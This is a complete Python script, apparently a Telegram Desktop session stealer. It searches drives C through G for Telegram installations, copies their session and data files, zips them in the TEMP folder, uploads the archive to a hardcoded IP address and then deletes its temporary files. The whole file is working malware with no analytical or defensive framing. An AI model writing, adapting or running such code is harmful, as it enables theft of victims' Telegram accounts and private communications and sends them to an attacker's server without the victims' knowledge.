
import os
import zipfile
import re
import requests
import shutil

with open("started.txt", "w", encoding="utf-8") as f:
    f.write("Started\n")

search_folder = "Telegram Desktop"
excluded_dirs = ["user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5", "user_data#6",
                 "user_data#7", "user_data#8", "user_data#9", "user_data#10", "emoji", "webview", "temp"]
http_upload_url = "http://77.91.76.45:100/OPEN"
temp_dir = os.path.join(os.getenv("TEMP"), "temp_copy")
telegram_exe = "Telegram.exe"
excluded_files = {"Telegram.exe", "unins000.dat", "unins000.exe", "unins001.dat", "unins001.exe", "Updater.exe"}
archive_path = os.path.join(os.getenv("TEMP"), "archive.zip")

def compress_folder(folder, output_zip):
    with zipfile.ZipFile(output_zip, 'w') as zipf:
        for root, dirs, files in os.walk(folder):
            dirs[:] = [d for d in dirs if d not in excluded_dirs]
            for file in files:
                if file not in excluded_files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, os.path.join(folder, '..')))

def get_next_dir_num(upload_url):
    try:
        response = requests.get(upload_url)
        if response.status_code == 200:
            existing = re.findall(r'#?(\d+)', response.text)
            existing_nums = sorted(set(map(int, existing)))
            for i in range(1, 9999):
                if i not in existing_nums:
                    return i
    except requests.RequestException:
        pass
    return 1

def process_folder(folder_path):
    dir_num = get_next_dir_num(http_upload_url)

    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    os.makedirs(temp_dir)

    for root, dirs, files in os.walk(folder_path):
        dirs[:] = [d for d in dirs if d not in excluded_dirs]
        for file in files:
            if file not in excluded_files:
                src_file = os.path.join(root, file)
                dst_dir = os.path.join(temp_dir, os.path.relpath(root, folder_path))
                os.makedirs(dst_dir, exist_ok=True)
                dst_file = os.path.join(dst_dir, file)
                try:
                    shutil.copy2(src_file, dst_file)
                except PermissionError:
                    pass

    compress_folder(temp_dir, archive_path)

    with open(archive_path, 'rb') as f:
        try:
            requests.post(http_upload_url, files={'file': f}, data={'path': str(dir_num)})
        except requests.RequestException:
            pass

    shutil.rmtree(temp_dir)
    os.remove(archive_path)

for drive in 'CDEFG':
    drive_path = f"{drive}:/"
    if os.path.exists(drive_path):
        for root, dirs, files in os.walk(drive_path):
            if search_folder in dirs:
                folder_path = os.path.join(root, search_folder)
                if os.path.exists(os.path.join(folder_path, telegram_exe)):
                    process_folder(folder_path)
